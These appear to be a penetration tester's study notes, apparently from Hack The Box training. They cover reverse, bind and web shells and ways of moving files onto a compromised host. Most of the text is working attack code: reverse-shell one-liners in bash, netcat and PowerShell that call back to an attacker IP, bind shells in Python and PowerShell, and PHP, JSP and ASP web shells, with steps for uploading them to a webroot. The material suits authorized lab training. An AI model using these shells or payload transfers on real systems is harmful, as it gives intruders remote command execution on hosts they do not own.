# shells

to enumerate the system or take further control over it or within its network, beyond the initial exploit, we need a reliable connection that gives us direct access to the system's shell, i.e., bash or powershell, so we can thoroughly investigate the remote system for our next move.

without a working set of login credentials, we would not be able to utilize methods like ssh or winrm, we'll need to executing commands on the remote system first, to gain access to these services in the first place.

the other method of accessing a compromised host for control and remote code execution is through shells.

- reverse shell: connects back to our system and gives us control through a reverse connection.
- bind shell: waits for us to connect to it and gives us control once we do.
- web shell: communicates through a web server, accepts our commands through http parameters, executes them, and prints back the output.

## reverse shell

step 1: start netcat locally with `nc -lvnp 1234`

- -l listen mode, to wait for a connection to connect to us.
- -v verbose mode, so that we know when we receive a connection.
- -n disable dns resolution and only connect from/to ips, to speed up the connection.
- -p 1234 port number netcat is listening on, and the reverse connection should be sent to.

step 2: find the connect back ip with `ip a`, then find the correct adapter. this would typically be eth0, wlan0 or tun0 (when using a vpn)

step 3: issue the reverse shell command.

this last step relies on the type of os the target machine runs. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md lists many remote shell execution strategies.

examples include

```
bash:

bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

bash:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

powershell

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

once the remote host connects to our machine, we can type away:

```
listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## bind shell

step 1: bind the shell to a port on the remote host to wait for us to connect, e.g.

```
bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

python

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

for reference, see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

step 2: now we use netcat locally to connect to the remote machine and can issue shell commands:

```
ChrisVomRhein@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## web shell

step 1: write the web shell. examples include:

```
php

<?php system($_REQUEST["cmd"]); ?>

jsp

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

asp

<% eval request("cmd") %>
```

step 2: upload the web shell to the host's webroot. defaults for different web servers are:

```
- Apache: /var/www/html/
- Nginx: /usr/local/nginx/html/
- IIS: c:\inetpub\wwwroot\
- XAMPP: C:\xampp\htdocs\
```

step 3: access the web shell through curl or browser, e.g.

```
ChrisVomRhein@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# file transfers

## wget

- create a http server hosting a file on the local machine, e.g. `cd /tmp && -m http.server 8000`.
- download the file to the target machine, e.g. `wget http://10.10.14.1:8000/linenum.sh`, alternatively use curl, e.g. `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`

## scp

granted we have obtained ssh user credentials on the remote host, we can "push" files from out machine via scp as follows: `scp linenum.sh user@remotehost:/tmp/linenum.sh`

## base64

in some cases, we may not be able to transfer the file. for example, the remote host may have firewall protections that prevent us from downloading a file from our machine. in this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. for example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows: `base64 shell -w 0`

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file: `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

## validating file transfers

to validate the format of a file, we can run the file command on it:

```
> file shell

shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

as we can see, when we run the file command on the shell file, it says that it is an elf binary, meaning that we successfully transferred it. to ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. on our machine, we can run md5sum on it:

```
> md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

now, we can go to the remote server and run the same command on the file we transferred:

```
> md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

as we can see, both files have the same md5 hash, meaning the file was transferred correctly. there are various other methods for transferring files. you can check out the file transfers module for a more detailed study on transferring files.
